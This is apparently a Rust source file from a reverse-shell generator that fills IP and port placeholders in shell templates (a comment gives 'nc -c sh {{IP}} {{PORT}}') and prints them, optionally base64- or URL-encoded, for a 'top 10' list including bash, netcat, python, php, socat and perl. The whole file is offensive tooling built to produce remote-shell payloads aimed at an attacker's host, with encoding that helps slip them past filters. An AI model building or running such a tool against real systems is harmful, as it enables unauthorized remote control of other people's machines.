use base64::Engine;
use inline_colorization::*;
use include_dir::{include_dir, Dir};

use crate::FORMATS_DIR;        //the ../../formats folder is included as crate

fn process_template(entry: &str, template: &str, ip: &str, port: u16, b64: bool, url: bool) {
    let coloured_ip = format!("{color_cyan}{}{color_reset}", ip);
    let coloured_port = format!("{color_cyan}{}{color_reset}", &port.to_string());
    let result = template                                                                //The templates look like this "nc -c sh {{IP}} {{PORT}}",
        .replace("{{IP}}", &coloured_ip)                                                 //we replace those keywords with the given informations.
        .replace("{{PORT}}", &coloured_port);

    println!("----------{}-----------\n{}", entry.to_ascii_uppercase(), result);

    if b64 {                                                                            //If subcommand --b64 was sent, print the base64 encoded shell
        println!(
            "base64: {}",
            base64::prelude::BASE64_STANDARD.encode(&result)
        );
    }

    if url {                                                                            //Same thing for --url subcommand
        println!(
            "url: {}",
            urlencoding::encode(&result)
        );
    }
    println!();
}

pub fn run(ip: String, port: u16, format: String, b64: bool, url: bool) {
    println!("~~~~~~~~~~~~~~~~~~~~~~~~~");
    println!("Forging shells");
    println!("~~~~~~~~~~~~~~~~~~~~~~~~~");
    println!("Format : {}", format);
    println!("IP     : {}", ip);
    println!("Port   : {}", port);
    println!("~~~~~~~~~~~~~~~~~~~~~~~~~\n");

    if format == "all" {                                                        //If subcommand --format is "all", prints every bloody shell known in history.
                                                                                //Probably pointless, but why not?
        for file in FORMATS_DIR.files() {
            let path = file.path();

            let file_name = match path.file_stem().and_then(|s| s.to_str()) {    //Does the file exist? => Stores the file name in `file_name`
                Some(name) => name,
                None => {
                    eprintln!("Invalid file name: {:?}", path);
                    continue;
                }
            };

            let template = match file.contents_utf8() {                            //Is the file readable? => Stores the file content in `template`
                Some(t) => t.to_string(),
                None => {
                    eprintln!("Cannot read file {:?}", path);
                    continue;
                }
            };

            process_template(file_name, &template, &ip, port, b64, url);            //Feed the process_template function with all parameters
        }

    } else if format == "top" {                                            //If subcommand0 --format is "top", prints the top 10 shells in the vriable format below
        let formats = [
            "bash-i", "nc-e", "python", "python3",
            "php", "socat", "perl", "ruby",
            "bash196", "telnet",
        ];

        for fmt in formats {                                            //For each format, fetch the corresponding template with get_template()
            let template = match get_template(fmt) {
                Some(t) => t,
                None => continue,
            };

            process_template(fmt, &template, &ip, port, b64, url);        //And process them
        }

    } else {
        let template = match get_template(&format) {                    //If --format is an actual format, performs the process once
            Some(t) => t,
            None => return,
        };

        process_template(&format, &template, &ip, port, b64, url);
    }
}

fn get_template(format: &str) -> Option<String> {                //Looks for a file in ../../formats and if found it returns the file content
    let filename = format!("{}.sf", format);

    let file = FORMATS_DIR.get_file(&filename)?;

    match file.contents_utf8() {
        Some(t) => Some(t.to_string()),
        None => {
            eprintln!("Erreur lecture fichier {}", filename);
            None
        }
    }
}
